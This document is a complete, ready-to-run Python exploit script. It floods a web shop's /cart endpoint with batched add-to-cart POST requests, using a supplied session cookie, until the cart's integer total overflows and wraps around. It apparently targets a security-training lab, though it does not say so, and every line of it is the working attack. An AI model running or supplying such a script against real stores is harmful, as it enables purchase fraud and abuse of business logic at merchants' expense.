import requests

def run_overflow(target_host, session_cookie, product_id, price_dollars,
                  current_qty=0, per_request_cap=99, int_ceiling=2147483647):
    price_cents = round(price_dollars * 100)
    target_qty = int_ceiling // price_cents
    remaining = target_qty - current_qty

    if remaining <= 0:
        print(f"Current qty ({current_qty}) already exceeds estimated target ({target_qty}).")
        print("Check the cart manually — you may already be past the ceiling.")
        return

    full_batches = remaining // per_request_cap
    leftover = remaining % per_request_cap

    s = requests.Session()
    s.cookies.set("session", session_cookie, domain=target_host)
    url = f"https://{target_host}/cart"

    print(f"Target total qty: {target_qty} | Sending {full_batches} batches of {per_request_cap} + 1 of {leftover}")

    for i in range(full_batches):
        s.post(url, data={"productId": product_id, "redir": "PRODUCT", "quantity": str(per_request_cap)})
        if (i + 1) % 1000 == 0:
            print(f"{i+1}/{full_batches} sent...")

    if leftover:
        s.post(url, data={"productId": product_id, "redir": "PRODUCT", "quantity": str(leftover)})

    print("Done. Refresh /cart now and check the total.")
    print("If it's still positive, the ceiling or price assumption was off — recalculate from the real number shown.")


if __name__ == "__main__":
    host = input("Target host (no https://): ").strip()
    cookie = input("Session cookie value: ").strip()
    pid = input("Product ID: ").strip()
    price = float(input("Item price in dollars (e.g. 1337.00): ").strip())
    current = int(input("Current quantity already in cart (0 if none): ").strip() or 0)

    run_overflow(host, cookie, pid, price, current_qty=current)
